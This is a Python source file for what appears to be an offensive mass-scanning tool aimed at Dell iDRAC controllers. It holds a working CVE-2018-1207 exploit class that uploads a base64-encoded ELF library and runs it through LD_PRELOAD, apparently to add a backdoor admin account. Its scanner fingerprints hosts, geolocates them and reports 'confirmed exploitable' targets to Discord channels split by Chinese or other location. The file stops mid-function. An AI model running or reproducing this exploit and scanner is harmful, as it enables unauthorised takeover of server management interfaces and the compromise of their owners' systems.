# ADD THESE IMPORTS AT THE TOP
import base64, struct, time
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from requests.adapters import HTTPAdapter

# Original imports remain the same
import aiohttp
from aiohttp import ClientTimeout, TCPConnector
import asyncio
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin, urlparse
from datetime import datetime, timedelta, timezone
from typing import Set, List, Dict
import ssl
import certifi
from flask import Flask, request, jsonify, render_template_string, session, redirect
import secrets
from asgiref.wsgi import WsgiToAsgi
import discord
from discord.ext import commands, tasks
import logging
from discord.ui import Button, View, Select
import io
import hashlib
import sys
import argparse
import json
import sqlite3
import os
import pycountry
import random
import time
from ipaddress import ip_address, AddressValueError
from pyfiglet import figlet_format
from colorama import Fore, Style, init
from multiprocessing.dummy import Pool as ThreadPool
from itertools import repeat

current_unix_time = int(time.time())

# ADD THIS CLASS DEFINITION AFTER OTHER CLASSES
class CustomHTTPAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        import ssl
        context = ssl.create_default_context()
        context.set_ciphers('ALL:@SECLEVEL=0')
        context.check_hostname = False
        context.minimum_version = ssl.TLSVersion.SSLv3
        super().init_poolmanager(*args, **kwargs, ssl_context=context)

# ADD THE EXPLOITER CLASS
class IDracExploiter:
    def __init__(self):
        self.timeout = 10
        # Payload from the exploit script (base64 encoded ELF binary)
        self.payload_code = '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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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'
    
    def call_url(self, sURL, oSession, bData=None, lstProxies={}, boolVerbose=False):
        try:
            if bData: 
                oResponse = oSession.post(sURL, data=bData, proxies=lstProxies, verify=False, timeout=60)
            else: 
                oResponse = oSession.get(sURL, proxies=lstProxies, verify=False, timeout=self.timeout)
            return oResponse
        except Exception as e:
            if boolVerbose:
                print(f"[-] Error calling {sURL}: {e}")
            return None

    def check_vuln(self, sIP, oSession, lstProxies={}, boolVerbose=False):
        oResponse = self.call_url(f'https://{sIP}/cgi-bin/login?LD_DEBUG=files', oSession, lstProxies=lstProxies)
        if oResponse is not None and 'calling init: /lib/' in oResponse.text:
            if boolVerbose:
                print('[*] Data returned: ')
                print(oResponse.text)
            return True
        return False

    def upload_and_run_library(self, bData, oSession, sIP, lstProxies, boolVerbose=False):
        iFFLAGS = 1
        bFAlias = b'RACPKSSHAUTHKEY1'
        bLib = bFAlias + (32 - len(bFAlias)) * b'\0'
        bLib += struct.pack('<L', len(bData))
        bLib += struct.pack('<L', iFFLAGS)
        bLib += bData

        oResp = self.call_url(f'https://{sIP}/cgi-bin/putfile', oSession, bLib, lstProxies, boolVerbose)
        if oResp is not None and oResp.status_code == 200:
            print('[+] File upload successful, giving the system 5 seconds before execution')
            for i in range(5, 0, -1):
                print(i, end='\r')
                time.sleep(1)
        else:
            print('[-] Error uploading a file, maybe timeout issue')
            return False
        
        oResp = self.call_url(f'https://{sIP}/cgi-bin/discover?LD_PRELOAD=/tmp/sshpkauthupload.tmp', oSession, None, lstProxies, boolVerbose)
        if oResp is not None and oResp.status_code == 200:
            if boolVerbose:
                print('[+] Response on executing the library: \n{}'.format(oResp.text))
            return True
        else:
            print('[-] Error executing the library')
            return False

    def exploit(self, target_ip, proxy=None, verbose=False):
        try:
            print(f'[+] Checking if https://{target_ip} is vulnerable')
            session = requests.Session()
            session.mount('https://', CustomHTTPAdapter())
            
            proxies = {'https': proxy} if proxy else {}
            
            if self.check_vuln(target_ip, session, proxies, verbose):
                print('[+] Success, target seems vulnerable')
                print('[+] Okay, uploading the pre-compiled file now, this might take a while: ')
                
                if self.upload_and_run_library(base64.b64decode(self.payload_code), session, target_ip, proxies, verbose):
                    print('[+] Successfully started the reconfiguration of user ID 13')
                    return True
                else:
                    print('[-] Exploit failed during upload/execution')
                    return False
            else:
                print('[-] Target is not vulnerable')
                return False
        except Exception as e:
            print(f'[-] Error during exploitation: {e}')
            return False

# ================= VULNERABILITY SCANNER INTEGRATION =================
# DUAL DISCORD INTEGRATION
CHINESE_GROUPCHAT_ID = "1455181170391388284"
NORMAL_GROUPCHAT_ID = "1455181226276294864"

# Rate limiting to avoid Discord API limits
last_discord_message = 0
MESSAGE_DELAY = 1.0  # 1 second between messages

# VULNERABLE IPS SAVING
VULNERABLE_IPS_FILE = "vulnerableexoscan.txt"      # Detailed file with all info
CLEAN_IPS_FILE = "ips.txt"                   # Clean file with just IPs

def is_chinese_ip_by_geo(geo_data):
    """Check if IP is Chinese based on geolocation data (not prefixes)"""
    if not geo_data:
        return False
    
    # Check country code (CN = China)
    country_code = geo_data.get('country_code', '').upper()
    if country_code == 'CN':
        return True
    
    # Check country name
    country = geo_data.get('country', '').lower()
    china_keywords = ['china', 'people\'s republic', 'prc']
    for keyword in china_keywords:
        if keyword in country:
            return True
    
    return False

def save_vulnerable_ips(ip_address, hostname="Unknown", version="iDRAC", firmware="Unknown", geo_data=None):
    """Save definitely vulnerable IP to both files"""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if geo_data and geo_data.get('country') != 'Unknown':
            location_info = f"{geo_data['city']}, {geo_data['region']}, {geo_data['country']}"
        else:
            location_info = "Unknown location"
        
        # 1. Save to vulnerableexoscan.txt (detailed format)
        detailed_entry = f"[{timestamp}] {ip_address} | Hostname: {hostname} | Version: {version} | Firmware: {firmware} | Location: {location_info} | CVE: CVE-2018-1207\n"
        
        with open(VULNERABLE_IPS_FILE, "a") as f:
            f.write(detailed_entry)
        
        # 2. Save to ip_listt.txt (clean IP only format) - ONE IP PER LINE
        with open(CLEAN_IPS_FILE, "a") as f:
            f.write(f"{ip_address}\n")
        
        print(f"  [SAVED] Vulnerable IP saved to both {VULNERABLE_IPS_FILE} and {CLEAN_IPS_FILE}")
        return True
    except Exception as e:
        print(f"  [ERROR] Failed to save IP to files: {str(e)}")
        return False

def get_ip_geolocation(ip_address):
    """Get geolocation data for an IP address using ip-api.com"""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return {
                    'country': data.get('country', 'Unknown'),
                    'country_code': data.get('countryCode', 'XX'),
                    'region': data.get('regionName', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'zip': data.get('zip', 'Unknown'),
                    'lat': data.get('lat', 0),
                    'lon': data.get('lon', 0),
                    'isp': data.get('isp', 'Unknown ISP'),
                    'org': data.get('org', 'Unknown Organization'),
                    'asn': data.get('as', 'Unknown ASN'),
                    'query': data.get('query', ip_address)
                }
    except Exception as e:
        print(f"  [GEOLOC] Failed to get geolocation for {ip_address}: {str(e)}")
    return None

def send_discord_alert_vuln(ip_address, cve_id="CVE-2018-1207", hostname="Unknown", version="iDRAC", firmware="Unknown"):
    """Send Discord alert when DEFINITELY VULNERABLE iDRAC is found (passed LD_DEBUG=files check)"""
    global last_discord_message
    
    # Get geolocation data FIRST
    geo_data = get_ip_geolocation(ip_address)
    
    # ================= CHECK IF CHINESE IP BY GEO =================
    is_chinese = is_chinese_ip_by_geo(geo_data)
    
    # Select Discord channel based on geolocation
    discord_api_url = f"https://discord.com/api/v10/channels/{CHINESE_GROUPCHAT_ID if is_chinese else NORMAL_GROUPCHAT_ID}/messages"
    print(f"  [CHINA] Chinese IP detected via geolocation: {ip_address}" if is_chinese else f"  [NORMAL] Non-Chinese IP: {ip_address}")
    
    DISCORD_HEADERS = {
        "Authorization": f"Bot {CONFIG['discord_bot_token']}",
        "Content-Type": "application/json"
    }
    
    # Rate limiting
    current_time = time.time()
    time_since_last = current_time - last_discord_message
    if time_since_last < MESSAGE_DELAY:
        time.sleep(MESSAGE_DELAY - time_since_last)
    
    # Build location string
    if geo_data:
        location_string = f"📍 **Location:** {geo_data['city']}, {geo_data['region']}, {geo_data['country']} ({geo_data['country_code']})"
        isp_string = f"**ISP:** {geo_data['isp']}"
        asn_string = f"**ASN:** {geo_data['asn']}" if geo_data['asn'] != 'Unknown ASN' else ""
        coordinates = f"**Coordinates:** {geo_data['lat']:.4f}, {geo_data['lon']:.4f}"
        
        if geo_data['lat'] != 0 and geo_data['lon'] != 0:
            map_link = f"**Map:** https://www.google.com/maps?q={geo_data['lat']},{geo_data['lon']}"
            location_info = f"{location_string}\n{isp_string}\n{asn_string}\n{coordinates}\n{map_link}"
        else:
            location_info = f"{location_string}\n{isp_string}\n{asn_string}"
    else:
        location_info = "📍 **Location:** Geolocation failed or private IP"
    
    # Build the message
    message_content = (
        f"🚨 **DEFINITELY VULNERABLE iDRAC FOUND**\n"
        f"**IP:** `{ip_address}`\n"
        f"**Hostname:** {hostname}\n"
        f"**Version:** {version}\n"
        f"**Firmware:** {firmware}\n"
        f"**CVE:** `{cve_id}`\n\n"
        f"{location_info}\n\n"
        f"**Time:** <t:{int(datetime.now().timestamp())}:R>\n"
        f"**Status:** ✅ **CONFIRMED EXPLOITABLE**\n"
        f"**Verification:** LD_DEBUG=files check passed"
    )
    
    # Add Chinese flag emoji for Chinese IPs
    if is_chinese:
        message_content = f"🇨🇳 **CHINESE TARGET** 🇨🇳\n" + message_content
    
    payload = {"content": message_content}
    
    try:
        response = requests.post(discord_api_url, headers=DISCORD_HEADERS, json=payload, timeout=10)
        if response.status_code == 200:
            if geo_data:
                channel_type = "CHINESE" if is_chinese else "NORMAL"
                print(f"  [DISCORD] {channel_type} channel alert sent for {ip_address} ({geo_data['city']}, {geo_data['country']})")
            else:
                channel_type = "CHINESE" if is_chinese else "NORMAL"
                print(f"  [DISCORD] {channel_type} channel alert sent for {ip_address} (No geolocation)")
            last_discord_message = time.time()
            
            # ================= SAVE VULNERABLE IP TO BOTH FILES =================
            save_vulnerable_ips(ip_address, hostname, version, firmware, geo_data)
            # ================= END SAVE =================
            
        elif response.status_code == 429:  # Rate limited
            retry_after = response.json().get('retry_after', 5)
            print(f"  [DISCORD] Rate limited, retrying in {retry_after}s...")
            time.sleep(retry_after)
            # Retry once
            response = requests.post(discord_api_url, headers=DISCORD_HEADERS, json=payload, timeout=10)
            if response.status_code == 200:
                if geo_data:
                    channel_type = "CHINESE" if is_chinese else "NORMAL"
                    print(f"  [DISCORD] {channel_type} channel alert sent for {ip_address} ({geo_data['city']}, {geo_data['country']}) - retry")
                else:
                    channel_type = "CHINESE" if is_chinese else "NORMAL"
                    print(f"  [DISCORD] {channel_type} channel alert sent for {ip_address} (No geolocation) - retry")
                last_discord_message = time.time()
                
                # ================= SAVE VULNERABLE IP TO BOTH FILES =================
                save_vulnerable_ips(ip_address, hostname, version, firmware, geo_data)
                # ================= END SAVE =================
                
        else:
            print(f"  [DISCORD] Failed to send alert: {response.status_code}")
            # Still save to files even if Discord fails
            save_vulnerable_ips(ip_address, hostname, version, firmware, geo_data)
    except Exception as e:
        print(f"  [DISCORD] Error: {str(e)}")
        # Still save to files even if Discord errors
        save_vulnerable_ips(ip_address, hostname, version, firmware, geo_data)

class IDracVulnerabilityScanner:
    def __init__(self):
        self.timeout = 10
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'Content-Type': 'application/json'}
        
    def get_page(self, sURL, sProxy=None):
        """Works on older SSLv3 systems"""
        oSession = requests.Session()
        oSession.mount('https://', CustomHTTPAdapter())
        try:
            if sProxy:
                oResponse = oSession.get(sURL, verify=False, proxies={'https': sProxy}, headers=self.headers, timeout=self.timeout)
            else:
                oResponse = oSession.get(sURL, verify=False, headers=self.headers, timeout=self.timeout)
            return oResponse
        except:
            return None
    
    def fingerprint_idrac(self, sIP, sProxy=None):
        """Fingerprint iDRAC version and get system info"""
        sURL = 'https://' + sIP
        
        # iDRAC 6 attempt
        oResponse = self.get_page(sURL + '/login.html', sProxy)
        if oResponse and oResponse.status_code == 200 and not 'idrac7' in oResponse.text.lower():
            sResult = oResponse.text
            if 'idrac6' in sResult.lower():
                sFWversion = 'Unknown'
                sSystem = sHostname = sLicense = ''
                for sLine in sResult.split('\n'):
                    if 'var tmphostname' in sLine.lower(): 
                        sHostname = sLine.split('"')[1].strip()
                    elif 'integrated dell remote access controller 6' in sLine.lower(): 
                        sLicense = sLine.split(r'- ')[1].split(r'<')[0]
                return {
                    'ip': sIP,
                    'hostname': sHostname,
                    'version': 'iDRAC6',
                    'license': sLicense,
                    'firmware': sFWversion,
                    'system': sSystem
                }
        
        # iDRAC 7 & 8 attempt
        oResponse = self.get_page(sURL + '/data?get=prodServerGen', sProxy)
        if oResponse and oResponse.status_code == 200:
            try:
                if '12g' in oResponse.text.lower(): 
                    sIDRACVersion = 'iDRAC7'
                else: 
                    sIDRACVersion = 'iDRAC8'
                
                oResponse = self.get_page(sURL + '/data?get=prodClassName', sProxy)
